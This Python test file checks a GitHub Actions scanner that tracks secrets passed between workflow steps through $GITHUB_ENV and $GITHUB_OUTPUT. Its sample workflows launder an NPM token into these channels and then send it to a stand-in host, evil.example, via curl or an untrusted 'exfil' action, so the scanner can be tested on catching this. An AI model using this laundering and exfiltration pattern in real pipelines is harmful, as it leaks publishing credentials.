"""Tests for cross-step taint propagation via ``$GITHUB_ENV`` and
``$GITHUB_OUTPUT`` in ``gha_secret_flow``.

These are the workflow-injection shapes the original Phase 4 detector
missed: an earlier step launders a secret into the cross-step
side-channel, a later step exfiltrates the laundered value with no
direct secret reference at the call site.
"""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, name: str, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / name
    p.write_text(body, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# $GITHUB_ENV cross-step propagation
# ---------------------------------------------------------------------------

def test_github_env_launder_then_egress_fires(tmp_path: Path) -> None:
    """Step 1 writes a secret-bound value to $GITHUB_ENV.  Step 2
    uses the laundered name in a curl egress.  The detector should
    fire on step 2 even though step 2's body has no direct
    ``secrets.X`` or ``env.X`` reference."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: echo "LAUNDER=$NPM_TOKEN" >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$LAUNDER
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    # Two run_block hits expected:
    #   * step 0 — its own body references $NPM_TOKEN (already
    #     handled by the per-step env path)
    #   * step 1 — propagated taint via $LAUNDER
    step_indices = sorted({h.step_index for h in run_hits})
    assert 1 in step_indices, (
        "expected propagated taint to fire on the downstream "
        f"egress step; got step_indices={step_indices}"
    )
    step_1 = [h for h in run_hits if h.step_index == 1][0]
    assert step_1.severity == "high"
    assert "NPM_TOKEN" in step_1.secret_names


def test_github_env_launder_with_secret_literal_directly(
    tmp_path: Path,
) -> None:
    """Step 1 uses ``${{ secrets.X }}`` directly inside an echo
    redirect to $GITHUB_ENV; step 2 egresses the laundered var.
    No env binding on step 1 — just the literal reference."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    egress = [
        h for h in hits
        if h.sink_kind == "run_block" and h.step_index == 1
    ]
    assert egress and egress[0].severity == "high"
    assert "NPM_TOKEN" in egress[0].secret_names


def test_github_env_quoted_redirect_form(tmp_path: Path) -> None:
    """``>> "$GITHUB_ENV"`` — quoted form — also propagates."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "X=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"
      - run: curl https://evil.example/?x=$X
""")
    hits = scan_target(tmp_path, [], [])
    assert any(
        h.sink_kind == "run_block" and h.step_index == 1
        for h in hits
    )


def test_github_env_with_braces_redirect_form(tmp_path: Path) -> None:
    """``>> "${GITHUB_ENV}"`` — brace form — also propagates."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "X=${{ secrets.NPM_TOKEN }}" >> "${GITHUB_ENV}"
      - run: curl https://evil.example/?x=$X
""")
    hits = scan_target(tmp_path, [], [])
    assert any(
        h.sink_kind == "run_block" and h.step_index == 1
        for h in hits
    )


def test_non_tainted_github_env_write_does_not_propagate(
    tmp_path: Path,
) -> None:
    """A workflow legitimately writing a static value to
    $GITHUB_ENV should not poison the downstream env namespace."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "VERSION=1.2.3" >> $GITHUB_ENV
      - run: curl https://example.com/version=$VERSION
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


# ---------------------------------------------------------------------------
# $GITHUB_OUTPUT cross-step propagation
# ---------------------------------------------------------------------------

def test_github_output_launder_then_action_exfil_fires(
    tmp_path: Path,
) -> None:
    """Step 1 (with id) writes a secret-derived value to
    $GITHUB_OUTPUT; step 2 passes ``steps.X.outputs.Y`` into an
    untrusted action.  The untrusted_action sink fires."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: echo "TOK=$NPM_TOKEN" >> $GITHUB_OUTPUT
      - uses: nobody/exfil@v1
        with:
          payload: ${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
    assert untrusted, (
        "expected untrusted_action finding on the downstream step"
    )
    assert untrusted[0].severity == "high"


def test_github_output_launder_then_run_egress_fires(
    tmp_path: Path,
) -> None:
    """Step 1 (with id) writes to $GITHUB_OUTPUT; step 2's run body
    reads ``steps.X.outputs.Y`` and pipes it to curl."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_OUTPUT
      - run: |
          curl https://evil.example/?t=${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    egress = [
        h for h in hits
        if h.sink_kind == "run_block" and h.step_index == 1
    ]
    assert egress and egress[0].severity == "high"


def test_github_output_to_trusted_action_does_not_fire_downstream(
    tmp_path: Path,
) -> None:
    """When the downstream consumer of a laundered output is a
    trusted action, the downstream step should NOT fire a separate
    ``untrusted_action`` finding.  (The laundering step itself
    still fires on the existing ``>> $GITHUB_OUTPUT`` egress shape
    — that's a legitimate signal regardless of who consumes it.)"""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        run: echo "TOK=${{ secrets.GITHUB_TOKEN }}" >> $GITHUB_OUTPUT
      - uses: actions/checkout@v4
        with:
          token: ${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    # Step 1 (the trusted-consumer step) must NOT emit an
    # untrusted_action finding via the cross-step propagation.
    untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
    assert not untrusted


def test_github_output_without_step_id_does_not_propagate(
    tmp_path: Path,
) -> None:
    """A step without an ``id:`` cannot expose outputs to downstream
    steps.  No taint binding should be recorded."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_OUTPUT
      - run: |
          curl https://evil.example/?t=${{ steps.nothing.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    # No taint propagation; downstream step references an output
    # from a non-existent / unbound step id → no finding.
    assert not any(
        h.sink_kind == "run_block" and h.step_index == 1
        for h in hits
    )


# ---------------------------------------------------------------------------
# Mask suppression with redirect propagation
# ---------------------------------------------------------------------------

def test_mask_in_body_still_propagates_redirect_taint(
    tmp_path: Path,
) -> None:
    """A body that masks one secret AND launders another via
    $GITHUB_ENV should still propagate the laundered taint to
    downstream steps.  Mask suppresses the ``run_block`` finding on
    this step but doesn't disarm the cross-step propagation."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "::add-mask::${{ secrets.NPM_TOKEN }}"
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_ENV
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    # Step 0 itself produces no run_block finding (mask suppresses).
    step_0 = [
        h for h in hits
        if h.sink_kind == "run_block" and h.step_index == 0
    ]
    assert not step_0
    # Step 1 fires via the propagated taint binding.
    step_1 = [
        h for h in hits
        if h.sink_kind == "run_block" and h.step_index == 1
    ]
    assert step_1 and step_1[0].severity == "high"
